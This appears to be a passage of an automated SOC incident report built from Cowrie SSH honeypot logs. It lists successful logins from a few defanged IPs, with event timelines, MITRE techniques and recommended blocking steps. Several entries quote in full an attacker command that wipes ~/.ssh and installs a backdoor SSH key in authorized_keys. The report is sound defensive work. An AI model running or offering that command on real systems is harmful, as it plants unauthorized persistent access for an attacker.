| `2026-06-03 06:47:24` | `cowrie.command.input` |
| `2026-06-03 06:47:24` | `cowrie.command.failed` |
| `2026-06-03 06:47:24` | `cowrie.log.closed` |
| `2026-06-03 06:47:24` | `cowrie.session.params` |
| `2026-06-03 06:47:24` | `cowrie.command.input` |
| `2026-06-03 06:47:24` | `cowrie.session.file_download` |
| `2026-06-03 06:47:24` | `cowrie.log.closed` |
| `2026-06-03 06:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc66ba4d046

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:47 |
| **Last Seen** | 2026-06-03 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:47:23` | `cowrie.session.connect` |
| `2026-06-03 06:47:23` | `cowrie.client.version` |
| `2026-06-03 06:47:23` | `cowrie.client.kex` |
| `2026-06-03 06:47:25` | `cowrie.login.success` |
| `2026-06-03 06:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7289148ce1

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:47 |
| **Last Seen** | 2026-06-03 06:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:47:26` | `cowrie.session.connect` |
| `2026-06-03 06:47:26` | `cowrie.client.version` |
| `2026-06-03 06:47:26` | `cowrie.client.kex` |
| `2026-06-03 06:47:26` | `cowrie.login.success` |
| `2026-06-03 06:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b34a557770b

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:53 |
| **Last Seen** | 2026-06-03 06:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:53:40` | `cowrie.session.connect` |
| `2026-06-03 06:53:40` | `cowrie.client.version` |
| `2026-06-03 06:53:40` | `cowrie.client.kex` |
| `2026-06-03 06:53:41` | `cowrie.login.success` |
| `2026-06-03 06:53:41` | `cowrie.session.params` |
| `2026-06-03 06:53:41` | `cowrie.command.input` |
| `2026-06-03 06:53:41` | `cowrie.command.failed` |
| `2026-06-03 06:53:41` | `cowrie.log.closed` |
| `2026-06-03 06:53:42` | `cowrie.session.params` |
| `2026-06-03 06:53:42` | `cowrie.command.input` |
| `2026-06-03 06:53:42` | `cowrie.session.file_download` |
| `2026-06-03 06:53:42` | `cowrie.log.closed` |
| `2026-06-03 06:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d1aae6112a

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:53 |
| **Last Seen** | 2026-06-03 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:53:43` | `cowrie.session.connect` |
| `2026-06-03 06:53:43` | `cowrie.client.version` |
| `2026-06-03 06:53:44` | `cowrie.client.kex` |
| `2026-06-03 06:53:44` | `cowrie.login.success` |
| `2026-06-03 06:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4452a0b52c

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:31 |
| **Last Seen** | 2026-06-03 07:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:31:46` | `cowrie.session.connect` |
| `2026-06-03 07:31:46` | `cowrie.client.version` |
| `2026-06-03 07:31:46` | `cowrie.client.kex` |
| `2026-06-03 07:31:46` | `cowrie.login.success` |
| `2026-06-03 07:31:47` | `cowrie.session.params` |
| `2026-06-03 07:31:47` | `cowrie.command.input` |
| `2026-06-03 07:31:47` | `cowrie.command.failed` |
| `2026-06-03 07:31:47` | `cowrie.log.closed` |
| `2026-06-03 07:31:47` | `cowrie.session.params` |
| `2026-06-03 07:31:47` | `cowrie.command.input` |
| `2026-06-03 07:31:47` | `cowrie.session.file_download` |
| `2026-06-03 07:31:47` | `cowrie.log.closed` |
| `2026-06-03 07:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1063cb3e56e6

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:31 |
| **Last Seen** | 2026-06-03 07:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:31:48` | `cowrie.session.connect` |
| `2026-06-03 07:31:48` | `cowrie.client.version` |
| `2026-06-03 07:31:48` | `cowrie.client.kex` |
| `2026-06-03 07:31:49` | `cowrie.login.success` |
| `2026-06-03 07:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794495ec361c

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:35 |
| **Last Seen** | 2026-06-03 07:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:35:52` | `cowrie.session.connect` |
| `2026-06-03 07:35:52` | `cowrie.client.version` |
| `2026-06-03 07:35:52` | `cowrie.client.kex` |
| `2026-06-03 07:35:52` | `cowrie.login.success` |
| `2026-06-03 07:35:53` | `cowrie.session.params` |
| `2026-06-03 07:35:53` | `cowrie.command.input` |
| `2026-06-03 07:35:53` | `cowrie.command.failed` |
| `2026-06-03 07:35:53` | `cowrie.log.closed` |
| `2026-06-03 07:35:53` | `cowrie.session.params` |
| `2026-06-03 07:35:53` | `cowrie.command.input` |
| `2026-06-03 07:35:53` | `cowrie.session.file_download` |
| `2026-06-03 07:35:53` | `cowrie.log.closed` |
| `2026-06-03 07:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9de6096cab

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:35 |
| **Last Seen** | 2026-06-03 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:35:55` | `cowrie.session.connect` |
| `2026-06-03 07:35:55` | `cowrie.client.version` |
| `2026-06-03 07:35:55` | `cowrie.client.kex` |
| `2026-06-03 07:35:55` | `cowrie.login.success` |
| `2026-06-03 07:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6311f2e57d

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:49 |
| **Last Seen** | 2026-06-03 07:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:49:32` | `cowrie.session.connect` |
| `2026-06-03 07:49:32` | `cowrie.client.version` |
| `2026-06-03 07:49:32` | `cowrie.client.kex` |
| `2026-06-03 07:49:32` | `cowrie.login.success` |
| `2026-06-03 07:49:32` | `cowrie.session.params` |
| `2026-06-03 07:49:32` | `cowrie.command.input` |
| `2026-06-03 07:49:32` | `cowrie.command.failed` |
| `2026-06-03 07:49:33` | `cowrie.log.closed` |
| `2026-06-03 07:49:33` | `cowrie.session.params` |
| `2026-06-03 07:49:33` | `cowrie.command.input` |
| `2026-06-03 07:49:33` | `cowrie.session.file_download` |
| `2026-06-03 07:49:33` | `cowrie.log.closed` |
| `2026-06-03 07:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cfb8a5b7519

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:49 |
| **Last Seen** | 2026-06-03 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:49:34` | `cowrie.session.connect` |
| `2026-06-03 07:49:34` | `cowrie.client.version` |
| `2026-06-03 07:49:34` | `cowrie.client.kex` |
| `2026-06-03 07:49:35` | `cowrie.login.success` |
| `2026-06-03 07:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec6c44b5d9a

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:51 |
| **Last Seen** | 2026-06-03 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:51:25` | `cowrie.session.connect` |
| `2026-06-03 07:51:25` | `cowrie.client.version` |
| `2026-06-03 07:51:25` | `cowrie.client.kex` |
| `2026-06-03 07:51:25` | `cowrie.login.success` |
| `2026-06-03 07:51:26` | `cowrie.session.params` |
| `2026-06-03 07:51:26` | `cowrie.command.input` |
| `2026-06-03 07:51:26` | `cowrie.command.failed` |
| `2026-06-03 07:51:26` | `cowrie.log.closed` |
| `2026-06-03 07:51:26` | `cowrie.session.params` |
| `2026-06-03 07:51:26` | `cowrie.command.input` |
| `2026-06-03 07:51:26` | `cowrie.session.file_download` |
| `2026-06-03 07:51:26` | `cowrie.log.closed` |
| `2026-06-03 07:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49367f892e0e

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:51 |
| **Last Seen** | 2026-06-03 07:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:51:28` | `cowrie.session.connect` |
| `2026-06-03 07:51:28` | `cowrie.client.version` |
| `2026-06-03 07:51:28` | `cowrie.client.kex` |
| `2026-06-03 07:51:28` | `cowrie.login.success` |
| `2026-06-03 07:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbcbf27f7808

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:53 |
| **Last Seen** | 2026-06-03 07:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:53:25` | `cowrie.session.connect` |
| `2026-06-03 07:53:25` | `cowrie.client.version` |
| `2026-06-03 07:53:25` | `cowrie.client.kex` |
| `2026-06-03 07:53:25` | `cowrie.login.success` |
| `2026-06-03 07:53:25` | `cowrie.session.params` |
| `2026-06-03 07:53:25` | `cowrie.command.input` |
| `2026-06-03 07:53:25` | `cowrie.command.failed` |
| `2026-06-03 07:53:25` | `cowrie.log.closed` |
| `2026-06-03 07:53:25` | `cowrie.session.params` |
| `2026-06-03 07:53:25` | `cowrie.command.input` |
| `2026-06-03 07:53:25` | `cowrie.session.file_download` |
| `2026-06-03 07:53:25` | `cowrie.log.closed` |
| `2026-06-03 07:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f6a46abe0f

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:53 |
| **Last Seen** | 2026-06-03 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:53:27` | `cowrie.session.connect` |
| `2026-06-03 07:53:27` | `cowrie.client.version` |
| `2026-06-03 07:53:27` | `cowrie.client.kex` |
| `2026-06-03 07:53:28` | `cowrie.login.success` |
| `2026-06-03 07:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f3bb64eed9

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:55 |
| **Last Seen** | 2026-06-03 07:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:55:25` | `cowrie.session.connect` |
| `2026-06-03 07:55:25` | `cowrie.client.version` |
| `2026-06-03 07:55:25` | `cowrie.client.kex` |
| `2026-06-03 07:55:26` | `cowrie.login.success` |
| `2026-06-03 07:55:26` | `cowrie.session.params` |
| `2026-06-03 07:55:26` | `cowrie.command.input` |
| `2026-06-03 07:55:26` | `cowrie.command.failed` |
| `2026-06-03 07:55:26` | `cowrie.log.closed` |
| `2026-06-03 07:55:26` | `cowrie.session.params` |
| `2026-06-03 07:55:26` | `cowrie.command.input` |
| `2026-06-03 07:55:26` | `cowrie.session.file_download` |
| `2026-06-03 07:55:26` | `cowrie.log.closed` |
| `2026-06-03 07:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8852a5a31f1c

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:55 |
| **Last Seen** | 2026-06-03 07:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:55:28` | `cowrie.session.connect` |
| `2026-06-03 07:55:28` | `cowrie.client.version` |
| `2026-06-03 07:55:28` | `cowrie.client.kex` |
| `2026-06-03 07:55:28` | `cowrie.login.success` |
| `2026-06-03 07:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf897e215b6

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:57 |
| **Last Seen** | 2026-06-03 07:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:57:23` | `cowrie.session.connect` |
| `2026-06-03 07:57:23` | `cowrie.client.version` |
| `2026-06-03 07:57:23` | `cowrie.client.kex` |
| `2026-06-03 07:57:23` | `cowrie.login.success` |
| `2026-06-03 07:57:23` | `cowrie.session.params` |
| `2026-06-03 07:57:23` | `cowrie.command.input` |
| `2026-06-03 07:57:23` | `cowrie.command.failed` |
| `2026-06-03 07:57:24` | `cowrie.log.closed` |
| `2026-06-03 07:57:24` | `cowrie.session.params` |
| `2026-06-03 07:57:24` | `cowrie.command.input` |
| `2026-06-03 07:57:24` | `cowrie.session.file_download` |
| `2026-06-03 07:57:24` | `cowrie.log.closed` |
| `2026-06-03 07:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
